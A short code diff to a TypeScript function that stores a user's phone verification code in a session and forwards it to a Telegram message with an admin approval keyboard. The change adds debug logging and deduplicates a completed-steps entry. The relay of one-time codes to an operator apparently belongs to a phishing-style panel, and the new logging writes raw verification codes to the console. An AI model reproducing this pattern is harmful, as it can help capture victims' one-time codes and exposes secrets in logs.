@@ -134,12 +134,25 @@ export const updatePhoneVerificationCode = async (
       return false;
     }
 
+    console.log("📝 Updating phone verification code:", {
+      sessionId,
+      verificationCode,
+      currentSteps: session.completedSteps,
+    });
+
     session.phoneVerificationCode = verificationCode;
-    session.completedSteps.push("phone_verification");
+
+    // Add phone_verification to completed steps if not already there
+    if (!session.completedSteps.includes("phone_verification")) {
+      session.completedSteps.push("phone_verification");
+    }
+
     session.currentStep = "waiting_admin";
 
     const updatedMessage = formatInitialMessage(session);
     const adminKeyboard = getAdminKeyboard(sessionId, session);
+
+    console.log("🎛️ Admin keyboard being sent:", adminKeyboard);
 
     await updateTelegramMessage(
       session.messageId,
@@ -148,6 +161,8 @@ export const updatePhoneVerificationCode = async (
     );
 
     activeSessions.set(sessionId, session);
+
+    console.log("✅ Phone verification updated successfully");
     return true;
   } catch (error) {
     console.error("❌ Failed to update verification code:", error);
